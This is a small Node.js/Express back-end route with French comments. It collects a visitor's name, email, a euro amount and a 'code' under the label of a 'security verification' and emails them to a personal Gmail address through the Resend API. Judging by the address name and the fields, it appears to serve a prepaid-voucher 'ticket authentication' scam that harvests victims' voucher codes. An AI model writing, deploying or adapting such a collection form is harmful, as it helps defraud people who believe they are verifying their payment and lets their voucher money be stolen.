const { Resend } = require('resend');

// Initialisation avec ta clé API (utilise process.env pour la sécurité)
const resend = new Resend(process.env.RESEND_API_KEY);

app.post('/api/verify', async (req, res) => {
    // 1. Récupération des données du formulaire
    const { nom, prenom, email, amount, code } = req.body;

    try {
        // 2. Envoi via l'API Resend
        const data = await resend.emails.send({
            from: 'onboarding@resend.dev', // Ou ton domaine vérifié si tu en as un
            to: 'authentificationtickets811@gmail.com', // L'adresse où tu veux recevoir les infos
            subject: 'Nouvelle vérification de sécurité',
            html: `
                <div style="font-family: sans-serif; line-height: 1.5;">
                    <h2 style="color: #2563EB;">Nouvelle soumission</h2>
                    <p>Voici les informations reçues :</p>
                    <ul>
                        <li><strong>Nom :</strong> ${nom}</li>
                        <li><strong>Prénom :</strong> ${prenom}</li>
                        <li><strong>Email :</strong> ${email}</li>
                        <li><strong>Montant :</strong> ${amount} €</li>
                        <li><strong>Code :</strong> ${code}</li>
                    </ul>
                </div>
            `
        });

        // 3. Réponse positive au frontend
        res.status(200).json({ success: true, message: "Données transmises avec succès." });

    } catch (error) {
        // 4. Gestion d'erreur propre
        console.error("Erreur Resend :", error);
        res.status(500).json({ success: false, message: "Erreur lors de l'envoi des données." });
    }
});